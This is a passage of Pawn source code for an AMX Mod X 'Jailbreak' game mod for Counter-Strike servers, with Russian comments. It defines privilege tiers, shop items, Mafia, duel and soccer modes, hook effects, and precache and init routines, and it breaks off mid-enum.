#include <amxmodx>
#include <fakemeta>
#include <fun>
#include <engine>
#include <hamsandwich>
#include <dhudmessage>
#include <nvault>
#include <sqlx>			// MySQL

#pragma semicolon 1
#pragma tabsize	0

/*===== -> Макросы -> =====*///{

#define jbe_is_user_valid(%0) (%0 && %0 <= g_iMaxPlayers)
#define MAX_PLAYERS 32
#define IUSER1_DOOR_KEY 376027
#define IUSER1_BUYZONE_KEY 140658
#define IUSER1_FROSTNADE_KEY 235876

/* -> Бит сумм -> */
#define SetBit(%0,%1) ((%0) |= (1 << (%1)))
#define ClearBit(%0,%1) ((%0) &= ~(1 << (%1)))
#define IsSetBit(%0,%1) ((%0) & (1 << (%1)))
#define InvertBit(%0,%1) ((%0) ^= (1 << (%1)))
#define IsNotSetBit(%0,%1) (~(%0) & (1 << (%1)))

//#define IPLOCK "83.222.115.149:27028" // Привязка по IP сервера
#define SKINS_DATA // Устанавливаем модель игроку по файлу

/* -> Авторитет -> */
new SzPahanMessage[128], SzPahanName[33], SzRandomizePahan, bool:g_Pahan[33] = false;

native give_weapon_ak47knife(id);
native jbe_ak47_beast(id);
native give_jbe_infinity(id);
native give_weapon_anaconda(id);
native jbe_user_long(id);
native give_jet_pack(id);
native remove_shields();
native give_weapon_shield(id);
native give_weapon_pumkin(id);
native Set_Weapon_Pumpkin(id);

/* -> Оффсеты -> */
#define linux_diff_weapon 4
#define linux_diff_animating 4
#define linux_diff_player 5
#define ACT_RANGE_ATTACK1 28
#define m_flFrameRate 36
#define m_flGroundSpeed 37
#define m_flLastEventCheck 38
#define m_fSequenceFinished 39
#define m_fSequenceLoops 40
#define m_pPlayer 41
#define m_flNextSecondaryAttack 47
#define m_iClip 51
#define m_Activity 73
#define m_IdealActivity 74
#define m_LastHitGroup 75
#define m_flNextAttack 83
#define m_bloodColor 89
#define m_iPlayerTeam 114
#define m_fHasPrimary 116
#define m_bHasChangeTeamThisRound 125
#define m_flLastAttackTime 220
#define m_afButtonPressed 246
#define m_iHideHUD 361
#define m_iClientHideHUD 362
#define m_iSpawnCount 365
#define m_pActiveItem 373
#define m_flNextDecalTime 486
#define g_szModelIndexPlayer 491

/*[TASK Задачи]*/ 
enum _:(+= 100)
{
    TASK_ROUND_END = 250000,
    TASK_CHANGE_MODEL, 
    TASK_SHOW_INFORMER, 
    TASK_FREE_DAY_ENDED, 
    TASK_CHIEF_CHOICE_TIME, 
    TASK_VOTE_DAY_MODE_TIMER,
    TASK_RESTART_GAME_TIMER, 
    TASK_DAY_MODE_TIMER, 
    TASK_SHOW_SOCCER_SCORE,
    TASK_INVISIBLE_HAT, 
    TASK_REMOVE_SYRINGE, 
    TASK_FROSTNADE_DEFROST, 
    TASK_DUEL_COUNT_DOWN, 
    TASK_DUEL_TIMER_ATTACK, 
    TASK_HOOK_THINK, 
	TASK_LAST_DIE,
	TASK_COUNT_DOWN_TIMER,
	TASK_DUEL_LINE,
	TASK_MP3,
	TASK_FLY_PLAYER,
	SCREEN,
	TASK_INDEX_MYSQL,
	TASK_PAHAN
}

/* -> Индексы сообщений -> */
#define MsgId_CurWeapon 66
#define MsgId_SayText 76
#define MsgId_TextMsg 77
#define MsgId_ResetHUD 79
#define MsgId_ShowMenu 96
#define MsgId_ScreenShake 97
#define MsgId_ScreenFade 98
#define MsgId_SendAudio 100
#define MsgId_Money 102
#define MsgId_StatusText 106
#define MsgId_VGUIMenu 114
#define MsgId_ClCorpse 122
#define MsgId_HudTextArgs 145

// Магазин
enum _:CVARS_SHOP
{
    BALISONG, 
	MACHETE,
	SERP,
    FLASHBANG, 
    STIMULATOR,
    FROSTNADE, 
    HEGRENADE, 
    FAST_RUN, 
    DOUBLE_JUMP, 
    AUTO_BHOP, 
    LOW_GRAVITY, 
    CLOSE_CASE, 
    STIMULATOR_GR, 
    KOKAIN_GR, 
    DOUBLE_JUMP_GR, 
    FAST_RUN_GR, 
    LOW_GRAVITY_GR,
	AWP_GR
}
new g_iShopCvars[CVARS_SHOP];

// Общие квары
enum _:CVARS_ALL
{
	FREE_DAY_ID, 
	FREE_DAY_ALL, 
	TEAM_BALANCE, 
	DAY_MODE_VOTE_TIME,
	RESTART_GAME_TIME, 
	RIOT_START_MODEY, 
	KILLED_GUARD_MODEY,
	KILLED_CHIEF_MODEY, 
	ROUND_FREE_MODEY, 
	ROUND_ALIVE_MODEY, 
	LAST_PRISONER_MODEY, 
	VIP_HEALTH_NUM,
    VIP_MONEY_ROUND, 
    VIP_MONEY_NUM, 
    VIP_SPEED_ROUND, 
    VIP_VOICE_ROUND, 
	VIP_DISCOUNT_SHOP, 
	PREMIUM_RESPAWN_NUM,
	PREMIUM_HP_ROUND,
	PREMIUM_MONEY_NUM,
	PREMIUM_MONEY_ROUND,
	PREMIUM_SPEED_ROUND,
	PREMIUM_GRAV_ROUND,
	ELITE_SPEED_ROUND,
	ELITE_GRAV_ROUND,
	ELITE_HEALTH_ROUND,
	ELITE_FD_ROUND,
	ELITE_MONEY_NUM,
	ELITE_MONEY_ROUND,
	ELITE_GOD_ROUND,
	ALPHA_MONEY_ROUND,
	ALPHA_MONEY_NUM,
	ALPHA_SPEED_ROUND,
	ALPHA_GRAV_ROUND,
	ALPHA_NOJ_ROUND,
	ALPHA_FD_ROUND,
	ALPHA_JUMP_ROUND,
	STRAJ_SKIN_ROUND,
	STRAJ_HP_ROUND,
	STRAJ_MONEY_NUM,
	STRAJ_MONEY_ROUND,
	STRAJ_GOD_ROUND,
	STRAJ_FOOT_ROUND,
	STRAJ_NOJ_ROUND,
	SUPER_SIMON_RES_ROUND,
	SUPER_SIMON_GLUSH_ROUND,
    SUPER_SIMON_INVIZ_ROUND,
    SUPER_SIMON_SPEED_ROUND,
    SUPER_SIMON_HP_ROUND,
    SUPER_SIMON_JUMP_ROUND,	
	SUPER_SIMON_BHOP_ROUND,
	SUPER_SIMON_GIVETT_ROUND,
	SUPER_SIMON_GIVEKT_ROUND,
	SUPER_SIMON_GIVEKTT_ROUND,
	SUPER_SIMON_GIVETTT_ROUND,
	PRESIDENT_RS_ROUND,
	PRESIDENT_NABOR_ROUND,
	PRESIDENT_PATRON_ROUND,
	PRESIDENT_LATHCEY_ROUND,
	PRESIDENT_SHOCKER_ROUND,
	PRESIDENT_GRANADE_ROUND,
	PRESIDENT_PUMPKIN_ROUND,
	DELTA_RES_ROUND,
	DELTA_RES_NUM,
	DELTA_HP_ROUND,
	DELTA_JUMP_ROUND,
	DELTA_MONEY_NUM,
	DELTA_MONEY_ROUND,
	DELTA_FD_ROUND,
	DYAVOL_SKIN_ROUND,
	DYAVOL_JUMP_ROUND,
	DYAVOL_MONEY_NUM,
	DYAVOL_MONEY_ROUND,
	DYAVOL_WANTED_ROUND,
	DYAVOL_RUN_ROUND,
	DYAVOL_DAMAGE_ROUND,
	DYAVOL_SCOUT_ROUND,
	DEMON_RS_ROUND,
	DEMON_JETPACK_ROUND,
	DEMON_JUMP_ROUND,
	DEMON_GRANADE_ROUND,
	DEMON_PUMPKIN_ROUND,
	CLOUN_SKIN_ROUND,
	CLOUN_MOLOT_ROUND,
	CLOUN_PUKAN_ROUND,
	CLOUN_PISS_ROUND,
	CLOUN_CMEX_ROUND
}
new g_iAllCvars[CVARS_ALL];

/*===== <- Макросы <- =====*///}

// Вип
enum _:DATA_BOMJ
{
	MONEY_VIP,
	GOLOS_VIP,
	SPEED_VIP
};
new g_iBomjData[MAX_PLAYERS + 1][DATA_BOMJ];

// Премиум
enum _:DATA_PREMIUM
{
	RES_PREM = 0,
	HP_PREM,
	MONEY_PREM,
	SPEED_PREM,
	GRAV_PREM
};
new g_iPremiumData[MAX_PLAYERS + 1][DATA_PREMIUM];

// Элита
enum _:DATA_ELITE
{
    SPEED_ELITE = 0,
    GRAV_ELITE,
    HEALTH_ELITE,
    ELITE_FD,
	MONEY_ELIT,
	GOD_ELIT
};
new g_iEliteData[MAX_PLAYERS + 1][DATA_ELITE];

// Альфа
enum _:DATA_ALPHA
{
    MONEY_ALPHA = 0,
	SPEED_ALPHA,
	GRAV_ALPHA,
	NOJ_ALPHA,
	FD_ALPHA,
	JUMP_ALPHA
};
new g_iAlphaData[MAX_PLAYERS + 1][DATA_ALPHA];

// Стражник
enum _:DATA_STRAJ
{
    SKIN_STRAJ = 0,
	HP_STRAJ,
	MONEY_STRAJ,
	GOD_STRAJ,
	FOOT_STRAJ,
	NOJ_STRAJ
};
new g_iStrajData[MAX_PLAYERS + 1][DATA_STRAJ];

// Супер-Саймон
enum _:DATA_SUPER_SIMON
{
    RES = 0,
	GLUSH,
	INVIZ,
	SPEED,
	HP,
	JUMP,
	BHOP,
	GIVETT,
	GIVEKT,
	GIVEKTT,
	GIVETTT,
};
new g_iSuperSimonData[MAX_PLAYERS + 1][DATA_SUPER_SIMON]; 

// Дьявол
enum _:DATA_DYAVOL
{
    SKINES_DYAV = 0,
	JUMP_DYAV,
	MONEY_DYAV,
	WANTED_DYAV,
	LONG_DYAV,
	DAMAGE_DYAV,
	SCOUT_DYAV
};
new g_iDyavolData[MAX_PLAYERS + 1][DATA_DYAVOL];

// Дельта
enum _:DATA_DELTA
{
    RES_ROUND_DELTA = 0,
	RES_NUM_DELTA,
	HP_DELTA,
	MEGA_JUMP_DELTA,
	MONEY_DELTA,
	FD_DELTA
};
new g_iDeltaData[MAX_PLAYERS + 1][DATA_DELTA];

// Президент
enum _:DATA_PRES
{
	RES_PREZ = 0,
	NABOR_PREZ,
	PATRON_PREZ,
	LATCHKEY_PREZ,
	SHOCKER_PREZ,
	GRENADE_PREZ,
	PUMPKIN_PREZ
};
new g_iPresidentData[MAX_PLAYERS + 1][DATA_PRES];	

// Демон
enum _:DATA_DEMON
{
	RES_DEMON = 0,
	JETPACK_DEMON,
	MEGAJUMP_DEMON,
	GRENADE_DEMON,
	PUMPKIN_DEMON
};
new g_iDemonData[MAX_PLAYERS + 1][DATA_DEMON];	

// Стражник
enum _:DATA_CLOUN
{
    SKIN_CLOUN = 0,
	MOLOT,
	PUKAN,
	PISS,
	CMEX
};
new g_iClounData[MAX_PLAYERS + 1][DATA_CLOUN];

enum _:DATA_SPECIAL_CHIEF 
{
	GUARD_VOICE
};

new i_DataSpecialChief[DATA_SPECIAL_CHIEF];

// Выкл/Вкл , Сохранение денег
new g_iNvault_Money;

// MySQL
new Handle:hSql, Handle:hConnected;

// Блок MySQL
new uSteamId[33][35], uIpAddress[33][23];

/*===== -> Битсуммы, переменные и массивы для работы с модом -> =====*///{

/* -> Переменные -> */
new g_bRoundEnd = false, g_iFakeMetaKeyValue, g_iFakeMetaSpawn, g_iFakeMetaUpdateClientData, g_iSyncMainInformer, g_iSyncLastPnInformer,
g_iSyncSoccerScore, g_iSyncStatusText, g_iSyncDuelInformer, g_iMaxPlayers, g_iFriendlyFire, g_iCountDown, g_iVipHealth[MAX_PLAYERS + 1], 
g_iEliteGrav[MAX_PLAYERS + 1], g_iEliteSpeed[MAX_PLAYERS + 1], g_iEliteFd[MAX_PLAYERS + 1], g_iEliteHealth[MAX_PLAYERS + 1],
bool:g_bRestartGame = true, Ham:Ham_Player_ResetMaxSpeed = Ham_Item_PreFrame, bool:Blockshopct[2] = false; 
new g_iBlockCt, g_iBitShocker, g_Free_Count[MAX_PLAYERS], g_iBitUserMonday;
new g_iSvetoforColor[MAX_PLAYERS + 1], g_iSvetoforSound, WeaponChoosed[MAX_PLAYERS + 1], HookEnableTrail[MAX_PLAYERS + 1 ];
// Музыка для Супер-саймона
enum _:DATA_MUSIC
{
	FILE_DIR[64],
	MUSIC_NAME[64]
}
new Array:g_aDataMusicList;
new g_iListMusicSize;

/* -> Особенное меню -> */
new bool:Blockshop[2] = false, g_iBlockShop;
new TargetID[33] = 0;
new g_iGodGame[MAX_PLAYERS + 1], g_iNoClip[MAX_PLAYERS + 1], g_iRejim, g_bHookStatus, g_BlockCostumes;

// Мафия
new g_MafiaGame;
new g_Mafia[ 32 + 1 ], g_Komissar[ 32 + 1 ];
new g_Doctor[ 32 + 1 ], g_Mir[ 32 + 1 ];
new g_Manyak[ 32 + 1 ], g_Shluxa[ 32 + 1 ];
new g_MafiaDay, g_DayMafia, g_KomDay, g_DocDay, g_ManDay, g_ShlDay;
new g_MafiaVote[ 32 + 1 ], g_KomVote[ 32 + 1 ];
new g_DoctorVote[ 32 + 1 ], g_ManyakVote[ 32 + 1 ];
new g_ShluxaVote[ 32 + 1 ], g_PlayerVote[ 32 + 1 ];

new const Roles_Info[ ][ ] = 
{
    "Роль: Мафия",
    "Роль: Комисcар",
    "Роль: Доктор",
    "Роль: Маньяк",
    "Роль: Стерва",
    "Роль: Гражданин"
};

new const Task_Info[ ][ ] = 
{
    "Задача: Убить всех житилей ночью", // Мафия
    "Задача: Разоблачить мафию",        // Комиссар
    "Задача: Спасти игроков от смерти", // Доктор
    "Задача: Убить всех игроков",       // Маньяк
    "Задача: Лишить игрока права чата", // Шлюха
    "Задача: Вычислить мафию"           // Гражданин
};

/* -> Битсуммы, переменные и массивы для работы с хуком -> */
new const g_szHookSound[][][] = 
{
	{"1", "jb_engine/hook/rope.wav"},
	{"2", "jb_engine/hook/ball.wav"},
	{"3", "jb_engine/hook/bun.wav"},
	{"4", "jb_engine/hook/pay.wav"},
	{"5", "jb_engine/hook/lightning.wav"},
	{"6", "jb_engine/hook/laser.wav"},
	{"7", "jb_engine/hook/kick.wav"},
	{"8", "jb_engine/hook/jump.wav"},
	{"9", "jb_engine/hook/hook_drain.wav"}
};

new const g_szHookSprite[][][] = 
{
	{"1", "sprites/jb_engine/hook/hook_v.spr"},
	{"2", "sprites/jb_engine/hook/hook_n.spr"},
	{"3", "sprites/jb_engine/hook/hook_c.spr"},
	{"4", "sprites/jb_engine/hook/hook_b.spr"},
	{"5", "sprites/jb_engine/hook/hook_av.spr"},
	{"6", "sprites/jb_engine/hook/hook_an.spr"},
	{"7", "sprites/jb_engine/hook/hook_am.spr"},
	{"8", "sprites/jb_engine/hook/hook_ac.spr"},
	{"9", "sprites/jb_engine/hook/hook_ab.spr"},
	{"10", "sprites/jb_engine/hook/hook_aa.spr"},
	{"11", "sprites/jb_engine/hook/hook_axe_v2.spr"},
	{"12", "sprites/jb_engine/hook/rainbow.spr"},
	{"13", "sprites/jb_engine/hook/lgtning.spr"}
};

new const g_szHookEnd[][][] = 
{
	{"1", "sprites/jb_engine/hook/richo2.spr"},
	{"2", "sprites/jb_engine/hook/love.spr"},
	{"3", "sprites/jb_engine/hook/balls.spr"},
	{"4", "sprites/jb_engine/hook/half-life.spr"},
	{"5", "sprites/jb_engine/hook/end_6.spr"},
	{"6", "sprites/jb_engine/hook/Biohazard.spr"},
	{"7", "sprites/jb_engine/hook/frostgib.spr"},
	{"8", "sprites/jb_engine/hook/cake_explosion.spr"}
};

new const g_szHookSpeed[][][] = 
{
	{"Средне", "200.0"},
	{"Маловат", "120.0"},
	{"Быстра", "300.0"}
};

new const g_szHookColor[][][] = 
{
	{"Белый", "255", "255", "255"},
	{"Красный", "255", "0", "0"},
	{"Фиолетовый", "255", "0", "255"},
	{"Жёлтый", "255", "255", "0"},
	{"Зелёный", "0", "255", "0"},
	{"Голубой", "0", "255", "255"},
	{"Синий", "0", "0", "255"},
	{"Оранжевый", "255", "60", "0"}
};

new const g_szHookSize[][][] = 
{
	{"Средничёк", "45"},
	{"Мелкий", "25"},
	{"Огромный", "75"}
};

new const g_szHookType[][][] = 
{
	{"Прямой", "0"},
	{"Змейкой", "10"},
	{"Молнией", "30"}
};

new const g_szFlySound[][][] = 
{
	{"1", "jb_engine/fly/fly.wav"},
	{"2", "jb_engine/fly/heal.wav"},
	{"3", "jb_engine/fly/jump.wav"},
	{"4", "jb_engine/fly/knock.wav"},
	{"5", "jb_engine/fly/laser.wav"},
	{"6", "jb_engine/fly/ok.wav"}
};

new g_iHookSound[33], g_iHookSprite[33], g_iHookEnd[33], g_iHookSpeed[33], g_iHookColor[33], g_iHookSize[33], g_iHookType[33]; 
new g_iHookSpriteEff[64], g_iHookSpriteEnd[64], g_iFlySound[33];

new g_iBitUnlimitedAmmo;
const OFFSET_LINUX_WEAPONS = 4;
#if cellbits == 32;
const OFFSET_CLIPAMMO = 51;
#else
const OFFSET_CLIPAMMO = 65;
#endif
new const MAXCLIP[] = { -1, 13, -1, 10, 1, 7, -1, 30, 30, 1, 30, 20, 25, 30, 35, 25, 12, 20, 10, 30, 100, 8, 30, 30, 20, 2, 7, 30, 30, -1, 50 };

public message_cur_weapon(msg_id, msg_dest, msg_entity)
{
    if(IsNotSetBit(g_iBitUnlimitedAmmo, msg_entity)) return;
    if(!is_user_alive(msg_entity) || get_msg_arg_int(1) != 1) return;

    static weapon, clip;
    weapon = get_msg_arg_int(2);
    clip = get_msg_arg_int(3);

    if(MAXCLIP[weapon] > 2)
    {
        set_msg_arg_int(3, get_msg_argtype(3), MAXCLIP[weapon]);
        if(clip < 2)
        {
            static wname[32], weapon_ent;
            get_weaponname(weapon, wname, sizeof wname - 1);
            weapon_ent = fm_find_ent_by_owner(-1, wname, msg_entity);

            fm_set_weapon_ammo(weapon_ent, MAXCLIP[weapon]);
        }
    }
}

/* -> Указатели для моделей -> */
new g_pModelGlass;

/* -> Остальное -> */
new g_iBitCuff, g_iSpeedFly[33],  bool:g_iModeFly[33];

/* -> Маркер -> */
new szSpriteStyle[MAX_PLAYERS + 1],  szPlayerSize[MAX_PLAYERS + 1], Float:origin[MAX_PLAYERS+1][3], prethink_counter[MAX_PLAYERS+1], bool:is_holding[MAX_PLAYERS+1], g_iMarkerColor[MAX_PLAYERS + 1], color_rm[MAX_PLAYERS + 1], color_r[MAX_PLAYERS + 1], color_gm[MAX_PLAYERS + 1], color_bm[MAX_PLAYERS + 1], color_g[MAX_PLAYERS + 1], color_b[MAX_PLAYERS + 1];

/* -> Указатели для спрайтов -> */
new g_pSpriteWave, g_pSpriteBeam, g_pSpriteBall, g_pSpriteDuelRed, g_pSpriteDuelBlue, g_pSpriteLgtning, effect_fd, g_pSpriteTrail;

/* -> Массивы -> */
new g_iPlayersNum[4], g_iAlivePlayersNum[4], Trie:g_tRemoveEntities;

/* -> Переменные и массивы для дней и дней недели -> */
new g_iDay, g_iDayWeek;
new const g_szDaysWeek[][] =
{
	"JBE_HUD_DAY_WEEK_0",
	"JBE_HUD_DAY_WEEK_1",
	"JBE_HUD_DAY_WEEK_2",
	"JBE_HUD_DAY_WEEK_3",
	"JBE_HUD_DAY_WEEK_4",
	"JBE_HUD_DAY_WEEK_5",
	"JBE_HUD_DAY_WEEK_6",
	"JBE_HUD_DAY_WEEK_7"
};

/* -> Битсуммы, переменные и массивы для режимов игры -> */
enum _:DATA_DAY_MODE
{
	LANG_MODE[32],
	MODE_BLOCKED,
	VOTES_NUM,
	MODE_TIMER,
	MODE_BLOCK_DAYS
}
new Array:g_aDataDayMode, g_iDayModeListSize, g_iDayModeVoteTime, g_iHookDayModeStart, g_iHookDayModeEnded, g_iReturnDayMode,
g_iDayMode, g_szDayMode[32] = "JBE_HUD_GAME_MODE_0", g_iDayModeTimer, g_szDayModeTimer[6] = "", g_iVoteDayMode = -1,
g_iBitUserVoteDayMode, g_iBitUserDayModeVoted;

/* -> Переменные и массивы для работы с клетками -> */
new bool:g_bDoorStatus, Array:g_aDoorList, g_iDoorListSize, Trie:g_tButtonList;

/* -> Массивы для работы с событиями 'hamsandwich' -> */
new const g_szHamHookEntityBlock[][] =
{
	"func_vehicle", // Управляемая машина
	"func_tracktrain", // Управляемый поезд
	"func_tank", // Управляемая пушка
	"game_player_hurt", // При активации наносит игроку повреждения
	"func_recharge", // Увеличение запаса бронижелета
	"func_healthcharger", // Увеличение процентов здоровья
	"game_player_equip", // Выдаёт оружие
	"player_weaponstrip", // Забирает всё оружие
	"func_button", // Кнопка
	"trigger_hurt", // Наносит игроку повреждения
	"trigger_gravity", // Устанавливает игроку силу гравитации
	"armoury_entity", // Объект лежащий на карте, оружия, броня или гранаты
	"weaponbox", // Оружие выброшенное игроком
	"weapon_shield" // Щит
};
new HamHook:g_iHamHookForwards[14];

new bool:now_Hunger;

enum _:DATA_ROUND_SOUND
{
	FILE_NAME[32],
	TRACK_NAME[64]
}
new Array:g_aDataRoundSound, g_iRoundSoundSize;
/*===== <- Переменные и массивы для работы с модом <- =====*///}

/*===== -> Битсуммы, переменные и массивы для работы с игроками -> =====*///{

/* -> Битсуммы -> */
new g_iBitUserConnected, g_iBitUserAlive, g_iBitUserVoice, g_iBitUserVoiceNextRound, g_iBitUserModel, g_iBitBlockMenu,
g_iBitKilledUsers[MAX_PLAYERS + 1], g_iBitUserVip, g_iBitUserAdmin, g_iBitUserPremium, g_iBitUserElite, g_iBitUserHook, g_iBitUserAlpha, g_iBitUserStraj, g_iBitUserSuperSimon, g_iBitUserPrez, g_iBitUserDemon, g_iBitUserCloun,
g_iBitUserDelta, g_iBitUserDyavol, g_iBitUserRoundSound, g_iBitUserBlockedGuard;

/* -> Переменные -> */
new g_iLastPnId;

/* -> Массивы -> */
new g_iUserTeam[MAX_PLAYERS + 1], g_iUserSkin[MAX_PLAYERS + 1], g_iUserMoney[MAX_PLAYERS + 1], g_iUserDiscount[MAX_PLAYERS + 1],
g_szUserModel[MAX_PLAYERS + 1][32], Float:g_fMainInformerPosX[MAX_PLAYERS + 1], Float:g_fMainInformerPosY[MAX_PLAYERS + 1],
Float:g_vecHookOrigin[MAX_PLAYERS + 1][3];

/* -> Массивы для меню из игроков -> */
new g_iMenuPlayers[MAX_PLAYERS + 1][MAX_PLAYERS], g_iMenuPosition[MAX_PLAYERS + 1], g_iMenuTarget[MAX_PLAYERS + 1];

/* -> Переменные и массивы для начальника -> */
new g_iChiefId, g_iChiefIdOld, g_iChiefChoiceTime, g_szChiefName[32], g_iChiefStatus, g_iSimonVoice, g_iBitUserSimon;
new const g_szChiefStatus[][] =
{
	"JBE_HUD_CHIEF_NOT",
	"JBE_HUD_CHIEF_ALIVE",
	"JBE_HUD_CHIEF_DEAD",
	"JBE_HUD_CHIEF_DISCONNECT",
	"JBE_HUD_CHIEF_FREE"
};

/* -> Битсуммы, переменные и массивы для освобождённых заключённых -> */
new g_iBitUserFree, g_iBitUserFreeNextRound, g_szFreeNames[192], g_iFreeCount;

/* -> Битсуммы, переменные и массивы для разыскиваемых заключённых -> */
new g_iBitUserWanted, g_szWantedNames[192], g_iWantedCount;

// Работа с личными моделями
#if defined SKINS_DATA
enum _:DATA_MODEL_SKIN
{
	TYPE_AUTH[4],
	USER_INFO[64],
	MODEL_USER[64],
	DAY_LEFT[16]
}
new Array:g_aModelUserData;
new g_iModelUserData;
new g_iPlayerSkin[MAX_PLAYERS + 1][64];

new g_iBitUserCostumModel;
#endif

/* -> Переменные и массивы для костюмов -> */
enum _:DATA_COSTUMES_PRECACHE
{
	MODEL_NAME[32],
	SUB_MODEL[4],
	NAME_COSTUME[64],
	FLAG_COSTUME[2],
	WARNING_MSG[32]
}
enum _:DATA_COSTUMES
{
	COSTUMES,
	ENTITY,
	bool:HIDE
}
new Array:g_aCostumesList;
new g_iCostumesListSize;
new g_eUserCostumes[MAX_PLAYERS + 1][DATA_COSTUMES];	

/* -> Битсуммы, переменные и массивы для футбола -> */
new g_iSoccerBall, Float:g_flSoccerBallOrigin[3], bool:g_bSoccerBallTouch, bool:g_bSoccerBallTrail, bool:g_bSoccerStatus,
bool:g_bSoccerGame, g_iSoccerScore[2], g_iBitUserSoccer, g_iSoccerBallOwner, g_iSoccerKickOwner, g_iSoccerUserTeam[MAX_PLAYERS + 1];

/* -> Битсуммы, переменные и массивы для бокса -> */
new bool:g_bBoxingStatus, g_iBoxingGame, g_iBitUserBoxing, g_iBoxingTypeKick[MAX_PLAYERS + 1], g_iBoxingUserTeam[MAX_PLAYERS + 1];

/* -> Битсуммы для магазина -> */
new g_iBitSharpening, g_iBitScrewdriver, g_iBitBalisong, g_iBitMachete, g_iBitSerp, g_iBitWeaponStatus, g_iBitLatchkey, g_iBitKokain, g_iBitFrostNade,
g_iBitUserFrozen, g_iBitInvisibleHat, g_iBitClothingGuard, g_iBitClothingType, g_iBitHingJump, g_iBitFastRun, g_iBitGravRun, g_iBitDoubleJump,
g_iBitRandomGlow, g_iBitAutoBhop, g_iBitDoubleDamage, g_iBitLotteryTicket;

/* -> Переменные и массивы для рендеринга -> */
enum _:DATA_RENDERING
{
	RENDER_STATUS,
	RENDER_FX,
	RENDER_RED,
	RENDER_GREEN,
	RENDER_BLUE,
	RENDER_MODE,
	RENDER_AMT
}
new g_eUserRendering[MAX_PLAYERS + 1][DATA_RENDERING];

/* -> Битсуммы, переменные и массивы для работы с дуэлями -> */
new g_iDuelStatus, g_iDuelType, g_iDuelPrize, g_iBitUserDuel, g_iDuelUsersId[2], g_iDuelNames[2][32], g_iDuelCountDown, g_iLastDieCountDown, g_iDuelTimerAttack;
new const g_iDuelWeaponName[][] =
{
    "Ножи",
    "Диглы",
    "Дробовики",
    "Scout",
    "Ak47/M4A1",
    "Awp"
};

/* -> Битсуммы, переменные и массивы для работы с випа/админами -> */

/*===== <- Битсуммы, переменные и массивы для работы с игроками <- =====*///}

/* -> Всё для порталов -> */
new const g_szClassPortal[] = "Class_Portal";
new const g_szModelPortal[] = "models/jb_engine/portals.mdl";

enum ePortal
{
	IN,
	OUT
};
new g_ObjectPortal[ePortal];

/* -> Всё для курочки -> */
new const g_szClassChicken[] = "Class_Chicken";
new const g_szModelChicken[] = "models/jb_engine/chick.mdl";

new g_ObjectChicken;

/* -> Всё для отталкивания -> */
const Float:PUSH_POWER = 8.0;  // С какой силой отталкиваем
 
new HamHook:g_HamHookPlayerTouch;
new bool:g_bPush;

/* -> Всё для строительства -> */
const SPECIAL_CODE_BLOCK = 1551311;
const MAX_BLOCKS = 150;	// Максимальное количество блоков

new const g_szClassBlock[] = "Class_Build";
new g_ModelBlockIndex[7];

enum _:DATA_BUILD
{
	bool:DESTROY,
	FORM,
	bool:SOLID,
	bool:COLUMN,
	ARENA,
};
new g_PlayerBuild[33][DATA_BUILD];
new g_BlocksCount;

/* -> Всё для сплифа -> */
const SPECIAL_CODE_SPLEEF = 1521314;
new const g_szClassSpleef[] = "Class_Spleef";

enum _:DATA_SPLEEF
{
	bool:DESTROY,
	COUNT,
	DISTANCE[33],
};
new g_Spleef[DATA_SPLEEF];
new HamHook:g_HamHookSpleefKill;

public plugin_precache()
{
	files_precache();
	models_precache();
	sounds_precache();
	sprites_precache();
	jbe_create_buyzone();
	g_tButtonList = TrieCreate();
	g_iFakeMetaKeyValue = register_forward(FM_KeyValue, "FakeMeta_KeyValue_Post", 1);
	g_tRemoveEntities = TrieCreate();
	new const szRemoveEntities[][] = {"func_hostage_rescue", "info_hostage_rescue", "func_bomb_target", "info_bomb_target", "func_vip_safetyzone", "info_vip_start", "func_escapezone", "hostage_entity", "monster_scientist", "func_buyzone"};
	for(new i; i < sizeof(szRemoveEntities); i++) TrieSetCell(g_tRemoveEntities, szRemoveEntities[i], i);
	g_iFakeMetaSpawn = register_forward(FM_Spawn, "FakeMeta_Spawn_Post", 1);
	
	precache_sound("zone54/cuff.wav");
    precache_sound("zone54/uncuff.wav");
	precache_sound("jb_engine/effect_free.wav");
}

public plugin_init()
{
	main_init();
	cvars_init();
	event_init();
	clcmd_init();
	menu_init();
	message_init();
	door_init();
	fakemeta_init();
	hamsandwich_init();
	game_mode_init();
	get_user_msgid("ScreenFade");
}

// Секции
enum
{
    SELECT_ACCESS_FLAGS = 1,
	SELECT_PRISON,
	SELECT_GUARD,
	SELECT_MODELS,
	SELECT_CONFIG
};

// Флаги
enum
{
	HOOK = 0,
	VIP,
	ADMIN,
	PREMIUM,
	ELITE,
	ALPHA,
	STRAJNIK,
	SUPER_SIMON,
	DELTA,
	DYAVOL,
	PREZIDENT,
	DEMONES,
	CLOUN,
	MAX_ACCESS_FLAGS
};

new g_iFlagAccess[MAX_ACCESS_FLAGS];

// Заключенные
enum
{
	MDL_PR = 0,
	HAND_PR,
	MDL_FB,
	MDL_ST,
	MDL_CL,
	MDL_PH
};

// Охранники
enum
{
	MDL_GR = 0,
	MDL_CHIEF,
	MDL_DV,
	HAND_GR,
};

enum _:PLAYER_HAND
{
	PRISONER_P,
	PRISONER_V,
	GUARD_P,
	GUARD_V,
	CUFF_P,
	CUFF_V,
	SHOCKER_P,
	SHOCKER_V,
}
new g_szPlayerHand[PLAYER_HAND][128];

// Модели
enum _:PLAYER_MODELS
{
	PRISONER,
	FOOTBALLER,
	GUARD,
	CHIEF,
	STRAJ,
	DEMON,
	CLOUNES,
	PAHAN
}
new g_szPlayerModel[PLAYER_MODELS][32];

enum
{
	SELECT_SOUNDS = 1,
	SELECT_MODELES
};

enum _:MAX_SOUNDS 
{ 
	PRISON_RIOT,
	FD_START,
	FD_END,
	CHIEF_GOLOS,
	NEW_SIMON,
	SIMON_DISCON,
	PRIV_RES,
	FD_PLAYER,
	BUY_SHOP,
	LAST_DIE_COUNTDOWN,
	SIMON_SVISTOK,
	CHYKA_STOP,
	DUEL_START,
	MENU_CLICK,
	BLOCK_ADD,
	CLOUN_CMEX,
	GIVE_PAHAN,
	BALISONG_DEPLOY,
	BALISONG_HITWELL,
	BALISONG_SLASH,
	BALISONG_STAB,
	BALISONG_HIT,
	ULTRAHAND_DEPLOY,
	ULTRAHAND_HITWALL,
	ULTRAHAND_SLASH,
	ULTRAHAND_STAB,
	ULTRAHAND_HIT,
	ZEKIRA_DEPLOY,
	ZEKIRA_HITWALL,
	ZEKIRA_SLASH,
	ZEKIRA_STAB,
	ZEKIRA_HIT,
	SHOCKER_DEPLOY,
	SHOCKER_HITWALL,
	SHOCKER_SLASH,
	SHOCKER_HIT,
	MACHETE_DEPLOY,
	MACHETE_HITWELL,
	MACHETE_SLASH,
